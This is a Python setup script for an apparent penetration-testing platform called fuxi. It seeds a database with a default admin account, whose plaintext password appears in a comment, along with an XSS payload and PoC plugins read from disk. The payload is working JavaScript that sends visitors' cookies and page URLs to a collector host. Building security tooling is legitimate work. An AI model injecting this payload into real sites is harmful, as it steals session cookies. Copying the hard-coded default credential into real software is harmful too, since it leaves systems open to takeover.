#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author  : jeffzhang
# @Time    : 2019/5/22
# @File    : db_init.py
# @Desc    : ""

import os
from fuxi.libs.data.poc_parser import poc_parser
from fuxi.database import MongoDB, T_ADMIN, T_XSS_PAYLOADS, T_POC_PLUGINS


def databases_init():
    if not MongoDB(T_ADMIN).find_one():
        MongoDB(T_ADMIN).insert_one({
            "username": "fuxi",
            "password": "6f8f0f8f897a7bbe04a96fca65a90395",  # passwd: whoami
            "salt": "76389b5c",
            "nick": "Administrator",
            "email": "jeffzh3ng@gmail.com",
            "authority": [],
            "date": "2019-01-01 23:59:59"
        })

    if not MongoDB(T_XSS_PAYLOADS).find_one():
        MongoDB(T_XSS_PAYLOADS).insert_one({
            "name": "document.cookie",
            "value": "var url = document.location.href\nvar data = 'cookie=' + encodeURIComponent("
                     "document.cookie)\nvar img = document.createElement('img');\nimg.width = 0;\nimg.height = "
                     "0;\nvar api = 'http://192.168.199.147:50010/xss';\nimg.src = "
                     "api+'?salt='+salt+'&url='+encodeURIComponent(url)+'&data='+ encodeURIComponent(data);\n",
            "date": "2019-01-01 23:59:59"
        })

    if not MongoDB(T_POC_PLUGINS).find_one():
        poc_list = []
        _poc_path = os.path.abspath(os.path.dirname(__file__)) + "/pocs"
        for poc in os.listdir(_poc_path):
            with open(_poc_path + "/" + poc, "r", encoding="UTF-8") as poc_read:
                poc_str = poc_read.read()
                poc_data = poc_parser(poc_str)
                poc_data['poc'] = poc_str
                poc_data['filename'] = poc
                poc_data['date'] = "2019-01-01 23:59:59"
                poc_list.append(poc_data)
        MongoDB(T_POC_PLUGINS).insert(poc_list)




